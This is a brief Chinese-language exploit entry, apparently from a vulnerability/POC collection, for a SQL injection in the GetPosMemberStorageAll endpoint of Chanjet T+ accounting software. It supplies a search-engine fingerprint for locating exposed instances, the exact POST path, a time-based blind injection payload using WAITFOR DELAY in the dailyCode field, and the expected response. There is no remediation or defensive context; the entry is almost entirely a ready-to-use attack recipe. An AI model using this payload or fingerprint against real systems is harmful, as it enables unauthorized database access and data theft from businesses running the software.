# 畅捷通T+GetPosMemberStorageAll存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`POST /tplus/POSSyncService.asmx/GetPosMemberStorageAll HTTP/1.1`

**Payload**
```
accNum=1&poscode=1&shiftCode=1&dailyCode=1';WAITFOR DELAY '0:0:5'--
```
- **响应特征**：200